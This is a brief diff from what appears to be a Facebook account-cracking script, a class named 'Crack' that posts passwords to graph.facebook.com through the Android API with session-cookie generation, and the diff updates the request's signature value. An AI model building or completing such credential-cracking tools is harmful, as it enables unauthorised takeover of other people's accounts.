@@ -489,7 +489,7 @@ class Crack:
 					"password": pw,
 					"sdk": "android",
 					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+					"sig": "fc0a7caa49b192f64f6f5a6d9643bb28"
 				}
 				headers = {
 					"Host": "graph.facebook.com",
